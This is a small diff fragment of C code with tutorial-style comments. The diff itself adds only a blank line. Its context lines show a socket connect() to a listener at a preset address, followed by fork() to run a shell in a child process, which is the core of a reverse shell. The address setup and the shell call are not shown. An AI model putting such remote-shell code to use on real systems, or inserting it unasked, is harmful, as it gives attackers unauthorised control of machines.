@@ -47,6 +47,7 @@ The current code works on UNIX basically linux and mac but if only in localhost 
 
   Also you have other options to make your own resolver or use other headers so lets move on to connect after filling our data in that structure...
 */
+  
 if(connect(sockhndl, (struct sockaddr*)&data, sizeof(data)) == 0){ // connect () takes our struct, a pack of data and connects us to one listerning in that ip and port as we defined if there is no listerner active it exits immediately.
 
 if(fork() == 0){ // fork to create child process and run our shell from there so if it breaks it will be catched by wait()
